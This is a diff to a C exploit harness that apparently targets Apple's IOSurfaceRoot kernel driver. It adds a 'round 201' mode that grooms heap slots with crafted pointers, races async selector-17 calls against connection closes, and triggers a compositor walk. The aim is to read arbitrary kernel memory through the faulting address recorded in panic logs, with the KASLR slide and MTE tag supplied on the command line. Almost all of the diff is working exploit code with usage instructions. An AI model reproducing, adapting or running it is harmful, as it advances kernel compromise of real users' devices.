@@ -24143,6 +24143,199 @@ new_modes:
                 rlog("=== r=200 complete ===\n");
             }
 
+            /* ================================================================
+             * r=201: Kernel memory read via panic log FAR oracle
+             *
+             * Point slot 0 at a known kernel address containing a non-zero
+             * qword. The compositor reads that qword, interprets it as a
+             * "next" pointer, and follows it. If the value is not a valid
+             * mapped kernel address → panic → FAR register in panic log
+             * contains the ACTUAL VALUE at that kernel address.
+             *
+             * This is a full 64-bit kernel memory read primitive!
+             * Cost: one kernel panic per qword read.
+             *
+             * Target: __DATA_CONST segment (contains vtable pointers, const
+             * data structures). First 8 bytes should contain a pointer value.
+             *
+             * Usage: iosurface_sel17 201 <hex_slide> <hex_kc_offset> [<hex_tag>]
+             * kc_offset = offset from unslid KC base to read from
+             * Default: __DATA_CONST start (0x7E18000)
+             * ================================================================ */
+            if (rounds == 201) {
+                rlog("=== r=201: Kernel qword read via panic FAR ===\n");
+
+                #define R201_DATACONST_OFF 0x07E18000ULL
+
+                uint64_t r201_slide = 0;
+                uint64_t r201_read_off = R201_DATACONST_OFF;
+                uint64_t r201_tag = 0xF;
+                int r201_have_slide = 0;
+
+                if (argc > 3) {
+                    const char *h = argv[3];
+                    r201_slide = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r201_slide <<= 4;
+                        if (c >= '0' && c <= '9') r201_slide |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r201_slide |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r201_slide |= (c - 'A' + 10);
+                    }
+                    r201_have_slide = 1;
+                }
+                if (argc > 4) {
+                    const char *h = argv[4];
+                    r201_read_off = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r201_read_off <<= 4;
+                        if (c >= '0' && c <= '9') r201_read_off |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r201_read_off |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r201_read_off |= (c - 'A' + 10);
+                    }
+                }
+                if (argc > 5) {
+                    const char *h = argv[5];
+                    r201_tag = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r201_tag <<= 4;
+                        if (c >= '0' && c <= '9') r201_tag |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r201_tag |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r201_tag |= (c - 'A' + 10);
+                    }
+                    r201_tag &= 0xF;
+                }
+
+                if (!r201_have_slide) {
+                    rlog("  ERROR: need slide and read offset\n");
+                    rlog("  Usage: iosurface_sel17 201 <hex_slide> <hex_kc_offset> [<hex_tag>]\n");
+                    rlog("  Example: 201 3889C000 7E18000  (read first qword of __DATA_CONST)\n");
+                    goto r201_done;
+                }
+
+                uint64_t r201_raw = R198_KC_BASE + r201_slide + r201_read_off;
+                uint64_t r201_target = (r201_raw & ~(0xFULL << 56)) | (r201_tag << 56);
+                r201_target = (r201_target & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                rlog("  Slide:      0x%llx\n", (unsigned long long)r201_slide);
+                rlog("  Read off:   0x%llx\n", (unsigned long long)r201_read_off);
+                rlog("  MTE tag:    0x%llx\n", (unsigned long long)r201_tag);
+                rlog("  Read addr:  0x%016llx\n", (unsigned long long)r201_target);
+                rlog("  Mechanism:  slot 0 = read_addr → compositor reads qword there\n");
+                rlog("              → interprets as next ptr → follows it → CRASH\n");
+                rlog("              → panic FAR = VALUE at read_addr\n");
+                rlog("  Duration:   10 seconds max\n");
+                rlog("\n  OUTCOMES:\n");
+                rlog("  - SURVIVE: qword at this addr is 0x0 (or valid ptr to zeros)\n");
+                rlog("  - CRASH data abort: FAR = the qword value (kernel read!)\n");
+                rlog("  - CRASH tag fault: MTE tag wrong on read_addr itself\n");
+
+                io_service_t r201_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r201_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r201_done; }
+
+                #define R201_GROOM_N 128
+                io_connect_t r201_gconns[R201_GROOM_N];
+                mach_port_t r201_gwps[R201_GROOM_N];
+                int r201_gn = 0;
+                for (int g = 0; g < R201_GROOM_N; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(r201_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        r201_gconns[r201_gn] = gc;
+                        r201_gwps[r201_gn] = gwp;
+                        r201_gn++;
+                    }
+                }
+                rlog("  Pre-opened %d groom conns\n", r201_gn);
+
+                /* Groom: slot0 = target addr, slot1 = 0, slot2 = 0 */
+                uint64_t r201_pdata[4] = {r201_target, 0, 0, 0};
+                p16_groom_conns = r201_gconns;
+                p16_groom_wps = r201_gwps;
+                p16_groom_n = r201_gn;
+                p16_groom_data = r201_pdata;
+                p16_groom_count = 0;
+                p16_groom_run = 1;
+                pthread_t r201_gths[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&r201_gths[t], NULL, p16_groom_spray, NULL);
+                usleep(1000);
+
+                uint64_t r201_inp[3] = {1, 2, 3};
+                io_connect_t r201_pcs[8]; int r201_phave[8];
+                for (int i = 0; i < 8; i++) {
+                    r201_phave[i] = (IOServiceOpen(r201_svc, mach_task_self(), 0,
+                        &r201_pcs[i]) == KERN_SUCCESS);
+                    if (r201_phave[i]) {
+                        mach_port_t tw = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                        mach_port_insert_right(mach_task_self(), tw, tw,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xFF;
+                        IOConnectCallAsyncMethod(r201_pcs[i], 17, tw, &ref, 1,
+                            NULL, 0, r201_inp, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), tw);
+                    } else r201_pcs[i] = IO_OBJECT_NULL;
+                }
+
+                p13_spam_run = 1;
+                p13_spam_conn = r201_phave[0] ? r201_pcs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = 1;
+                p13_spam_count = 0;
+                pthread_t r201_spam[16];
+                for (int t = 0; t < 16; t++)
+                    pthread_create(&r201_spam[t], NULL, p13_spam_reg, NULL);
+
+                for (int i = 7; i >= 0; i--) {
+                    if (r201_phave[i]) { IOServiceClose(r201_pcs[i]); r201_phave[i] = 0; }
+                    usleep(100);
+                }
+                p13_spam_run = 0;
+                for (int t = 0; t < 16; t++) pthread_join(r201_spam[t], NULL);
+                for (int i = 0; i < 8; i++) if (r201_phave[i]) IOServiceClose(r201_pcs[i]);
+                usleep(2000);
+                p16_groom_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(r201_gths[t], NULL);
+
+                rlog("  Groom count=%llu\n", (unsigned long long)p16_groom_count);
+
+                rlog("\n  ** Triggering compositor walk — expect CRASH **\n");
+                rlog("  ** Panic FAR should contain the VALUE at 0x%016llx **\n",
+                     (unsigned long long)r201_target);
+
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r201_pr;
+                pthread_create(&r201_pr, NULL, p13_render_loop, NULL);
+
+                for (int s = 0; s < 10; s++) {
+                    usleep(1000000);
+                    rlog("  +%ds alive, frames=%d\n", s + 1, p13_render_frames);
+                }
+
+                p13_render_run = 0;
+                pthread_join(r201_pr, NULL);
+
+                rlog("\n  ** SURVIVED 10s — value at target addr is 0 or valid chain **\n");
+                rlog("  ** VALUE AT 0x%016llx = 0x0 (or valid pointer to zeros) **\n",
+                     (unsigned long long)r201_target);
+
+                for (int g = 0; g < r201_gn; g++) {
+                    IOServiceClose(r201_gconns[g]);
+                    mach_port_deallocate(mach_task_self(), r201_gwps[g]);
+                }
+                IOObjectRelease(r201_svc);
+
+                r201_done:
+                rlog("=== r=201 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
